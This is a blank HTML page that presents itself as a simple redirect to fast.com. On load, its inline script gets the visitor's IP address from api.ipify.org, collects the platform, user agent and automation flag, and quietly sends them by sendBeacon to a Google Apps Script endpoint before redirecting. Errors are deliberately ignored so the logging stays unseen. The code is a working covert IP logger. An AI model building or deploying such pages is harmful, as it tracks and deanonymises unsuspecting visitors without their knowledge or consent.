<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>html, body { background-color: #ffffff; margin: 0; padding: 0; height: 100%; }</style>
    <script>
        (async function() {
            const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbypwMn_1VTtTUvTcJz9T6pOAPMr42LmMQ3Wftmg2qZNE8O_QLbrpLgHyiG_Kpl6iuzW/exec";
            const TARGET_URL = "https://www.fast.com";

            try {
                // 1. Get IP & Geo (Using a fast, reliable promise)
                const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => ({ip: 'Unknown'}));
                const ipData = await ipRes.json ? await ipRes.json() : {ip: 'Unknown'};
                
                const telemetry = {
                    ip: ipData.ip,
                    platform: navigator.platform || "Unknown",
                    isAutomated: navigator.webdriver || false,
                    userAgent: navigator.userAgent || "Unknown"
                };

                // 2. Use sendBeacon for 100% reliable logging during navigation
                // This is asynchronous and guaranteed by the browser to complete
                const blob = new Blob([JSON.stringify(telemetry)], { type: 'application/json' });
                navigator.sendBeacon(WEB_APP_URL, blob);

            } catch (e) {
                // Ignore errors
            }

            // 3. Instant Redirect
            window.location.replace(TARGET_URL);
        })();
    </script>
</head>
<body></body>
</html>
